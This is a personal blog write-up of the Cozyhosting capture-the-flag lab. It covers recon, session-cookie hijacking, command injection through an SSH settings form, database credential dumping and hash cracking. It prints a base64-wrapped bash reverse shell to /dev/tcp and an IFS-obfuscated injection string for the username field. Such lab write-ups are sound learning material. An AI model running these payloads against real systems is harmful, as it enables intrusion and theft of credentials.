---
layout: post
title: "Cozyhosting"
date: 2023-11-05
categories: ["Hands-on", "TryHackMe"]
tags: ""
---

# Cozyhosting
> This is a machine that allows you to practise web app hacking and privilege escalation 

Used: **nmap**, **gobuster**, **postgres**, **sql**, **john**,  

## Introduction
This machine did step me out of my comfort zone and knowledge, it started off as easy but slowly exposed me to new techniques and topics in way that huumbled me and open my eyes that it will only get harder. That is the way to learn to push and push even when you dont know as long as you are pushing and learning it will get easier in time. This

Due to this machine being hard since I didnt have the knowledge, I had to use different walkrhoughs and it felt satisfying to finish it. 

## Scanning and Recon

### Nmap
I started off scanning the target using NMAP and found 8 open ports including HTTP, SSH. 

### Gobuster
I wasnt able to access the website until i added it to the /etc/hosts file. After sucessfully editting the file, I was able to access the website and find the login screen. 

After failing to try to use default credentials I went to gobuster to enumerate any hidden paths. Once thing that stood out while scanning was the session page! When accessing the session page I can see a user Kanderson with his session, and since his the only user that is authorized stealing his session will give me access to whatever there is!


## Initial access

### Imporsonating Kanderson - Cookie stealing
I had several issues when trying to access the cookie, maybe i shouldve understood cookies and researched more. At first i accessed the developer tool in my browser and changed the name to 'Kanderson' and the value was the session key. That did not work because later while reading the walkthroughs, I found out that the name is not supposed to be Kanderson but was supposed to be JESSIONID.


### SSH
at the end of the page there is a connection setting that can add my hostname and username to the hosts i the ssh authorised_key file! I understood that this can give me the shell access but i did not know how to exploit it.

With the walkthrough as a guide, i opened burpsuit and started looking at what happens when i pass in the inputs. Nothing intresting happens, but when i leave the username empty and send it out  i get an error SSH usage!

#### Payload
https://medium.com/@depradip_8731/cozyhosting-hackthebox-writeup-531082c06bb3

The walkthrough explains how to create the payload needed to gain access to the SSH. First I needed to create the base 64 of a bash reverse shell 

```bash
echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
```

After I need to add it to the payload to be sent as the username!

```bash
;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

But before sending i needed to encode it, i had few errors without doing this step. I started the listener and then sent it out.

## Escalating 
Once I gained access to the maichine i found a jar file, i extracted it and downloaded it into my machine to see. While checking each file i found the application.properties that had the username and the password for the database

### Database
I went back to the target ssh session, and ran the below bash code to access the database. Once i was connected and displayed the tables within the data i notice the users table.. thats interesting.


```bash
psql -h 127.0.0.1 -U postgres
```

Connecting to cozyhosting database
```bash
\c cozyhosting
```

Displaying the list of relations within the database
```bash
\d
```

when selecting all from the user table it provided me with both the user kanderson and admin hashed password! All i had to do is crack it.. that should be easy

```bash
select * from users;
```

### Hash cracking 
I copied the admin hash and used John to crack it with the rockyou as the wordlist. After few seconds the password was prompted into my screen

```bash
john hash.txt --wordlist=wordlist
```

### SSH
I closed the remote session for cozyhosting and attempted to log in as the admin Josh. With that i had access to both the user.txt and the root.txt for the flag needed to complete the CTF 



## Walkthrough references: 
- https://medium.com/@cybrpunk_panda/cozyhosting-writeup-hack-the-box-40d37b3075cd
- https://www.linkedin.com/pulse/cozyhosting-htb-walkthrough-jeffrey-huffman/
- https://medium.com/@depradip_8731/cozyhosting-hackthebox-writeup-531082c06bb3
https://gtfobins.github.io/gtfobins/ssh/#sudo

